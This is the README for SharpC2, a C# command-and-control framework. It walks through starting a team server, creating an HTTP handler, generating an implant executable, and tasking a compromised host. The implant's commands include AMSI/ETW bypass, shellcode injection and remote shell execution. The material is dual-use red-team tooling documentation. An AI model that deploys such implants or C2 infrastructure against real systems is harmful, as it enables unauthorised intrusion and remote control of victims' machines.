[![Build Status](https://travis-ci.com/SharpC2/SharpC2.svg?branch=main)](https://travis-ci.com/SharpC2/SharpC2)
[![Documentation Status](https://readthedocs.org/projects/sharpc2/badge/?version=latest)](https://sharpc2.readthedocs.io/en/latest/?badge=latest)

# SharpC2

SharpC2 is a Command and Control Framework written in C#.

The solution consists of an ASP.NET Core Team Server, a .NET Framework Implant, and a .NET Client.

## Quick Start

The quickest way to have a play with the framework is clone the repo, then build and run the Debug versions.

```
PS C:\Tools\SharpC2> dotnet build

  Client -> C:\Tools\SharpC2\Client\bin\Debug\net6.0\SharpC2.dll
  TeamServer -> C:\Tools\SharpC2\TeamServer\bin\Debug\net6.0\TeamServer.dll

Build succeeded.
    0 Warning(s)
    0 Error(s)

Time Elapsed 00:00:01.98
```

### Start the Team Server

```
PS C:\Tools\SharpC2> cd .\TeamServer\bin\Debug\net6.0\
PS C:\Tools\SharpC2\TeamServer\bin\Debug\net6.0> dotnet TeamServer.dll -p Passw0rd!
info: Microsoft.Hosting.Lifetime[14]
      Now listening on: https://0.0.0.0:8443
info: Microsoft.Hosting.Lifetime[0]
      Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
      Hosting environment: Production
info: Microsoft.Hosting.Lifetime[0]
      Content root path: C:\Tools\SharpC2\TeamServer\bin\Debug\net6.0
```

**Note**:  If the server starts in `Development` mode, it will only listen for connections on the `localhost`.  To ensure it runs in `Production` mode (and therefore listen for connections on all interfaces) set the `ASPNETCORE_ENVIRONMENT` variable to `Production`.

### Start the Client

```
PS C:\Tools\SharpC2\Client\bin\Debug\net6.0> dotnet SharpC2.dll -s localhost -p 8443 -n rasta -P Passw0rd!

  ___ _                   ___ ___
 / __| |_  __ _ _ _ _ __ / __|_  )
 \__ \ ' \/ _` | '_| '_ \ (__ / /
 |___/_||_\__,_|_| | .__/\___/___|
                   |_|
    @_RastaMouse
    @_xpn_


Server Certificate
------------------

[Subject]
  CN=localhost

[Issuer]
  CN=localhost

[Serial Number]
  67B4A5487F67745B

[Not Before]
  25/02/2021 21:01:43

[Not After]
  25/02/2022 21:01:43

[Thumbprint]
  B968C8D9C2B40F4AD7A46C92B0B700DEE46492FE

accept? [y/N] >
```

### Create & Start HTTP Handler

Use the `create` command to create a new handler.  The usage is: `create <name> <type>`. Valid types are `HTTP`, `TCP` and `SMB`.

```
[drones] > handlers
[handlers] > list

No Handlers

[handlers] > create demo-http HTTP
[+] Handler "demo-http" created.
```

When a handler has been created, you can set its parameters with the `set` command.  The usage is: `set <handler> <parameter> <value>`.

```
[handlers] > set demo-http BindPort 8080
[+] BindPort set to 8080

[handlers] > set demo-http ConnectPort 8080
[+] ConnectPort set to 8080
```

Finally, run the handler with the `start` command.  The usage is: `start <handler>`.

```
[handlers] > start demo-http
[+] Handler "demo-http" started.

[handlers] > list

Name       Running
----       -------
demo-http  True
```

### Generate a Payload for the Handler

Use the `payload` command to generate a payload for a handler.  The usage is: `payload <handler> <format> <path>`.  Valid formats are: `Exe`, `Dll`, `Raw` & `Svc`.

```
[drones] > payload demo-http Exe c:\payloads\http-drone.exe
[+] 164352 bytes saved.
```

Execute the payload, and the Drone should check-in.

```
[+] Drone fea75efa53 checked in from Daniel@Ghost-Canyon.

[drones] > list

Guid        Parent  Address        Hostname      Username  Process     Pid    Integrity  Arch  LastSeen
----        ------  -------        --------      --------  -------     ---    ---------  ----  --------
fea75efa53  -       192.168.1.229  Ghost-Canyon  Daniel    http-drone  17300  Medium     x64   18/12/2021 16:11:20
```

### Interacting with a Drone

Interact with a Drone via the `interact` command.  Usage is: `interact <guid>`.

```
[drones] > interact fea75efa53
[fea75efa53] > help

Name              Description
----              -----------
abort             Abort a running task
back              Go back to the previous screen
bypass            Set a directive to bypass AMSI/ETW on tasks
cat               Read a file as text
cd                Change working directory
execute-assembly  Execute a .NET assembly
exit              Exit this Drone
getuid            Get current identity
help              Print a list of commands and their description
link              Link to an SMB Drone
load-module       Load an external Drone module
ls                List filesystem
mkdir             Create a directory
overload          Map and execute a native DLL
ps                List running processes
pwd               Print working directory
rm                Delete a file
rmdir             Delete a directory
run               Run a command
services          List services on the current or target machine
shell             Run a command via cmd.exe
shinject          Inject arbitrary shellcode into a process
sleep             Set sleep interval and jitter
upload            Upload a file to the current working directory of the Drone

[fea75efa53] > getuid
[+] Tasked Drone to run getuid: 3989657f56.
[+] Drone checked in. Sent 176 bytes.
[+] Drone task 3989657f56 is running.

GHOST-CANYON\Daniel

[+] Drone task 3989657f56 has completed.
```

## Documentation

See more documentation on [Read the Docs](https://sharpc2.readthedocs.io/en/latest).